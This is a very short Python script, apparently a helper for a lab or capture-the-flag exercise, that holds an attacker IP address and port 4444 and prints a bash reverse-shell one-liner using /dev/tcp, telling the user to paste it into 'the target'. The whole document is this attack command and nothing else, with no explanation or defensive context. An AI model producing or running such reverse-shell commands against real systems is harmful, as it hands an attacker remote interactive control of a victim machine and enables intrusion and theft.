ip = "10.9.0.1"
port = 4444

print("Copy and paste this into the target:")
print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")